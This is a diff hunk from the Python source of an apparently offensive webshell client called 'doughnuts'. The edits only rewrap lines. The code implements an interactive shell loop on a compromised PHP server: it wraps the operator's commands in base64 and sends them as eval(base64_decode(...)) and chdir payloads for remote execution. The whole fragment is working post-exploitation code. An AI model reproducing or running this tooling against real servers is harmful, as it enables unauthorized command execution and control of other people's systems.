@@ -49,7 +49,8 @@ def run(*commands):
             return
         print(color.green("\nResult:\n\n") + res.r_text.strip() + "\n")
         return
-    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
+    print(color.cyan(
+        "Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
     pwd = send(f'print(getcwd());').r_text.strip()
     set_namespace("webshell", False, True)
     wordlist = gget("webshell.wordlist")
@@ -69,12 +70,14 @@ def run(*commands):
             b64_pwd = base64_encode(pwd)
             if (lower_command.startswith("cd ") and len(lower_command) > 3):
                 path = base64_encode(lower_command[3:].strip())
-                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
+                res = send(
+                    f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                 if (not res):
                     return
                 pwd = res.r_text.strip()
             else:
-                res = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{command}\'));");')
+                res = send(
+                    f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{command}\'));");')
                 if (not res):
                     return
                 print("\n" + res.r_text.strip() + "\n")
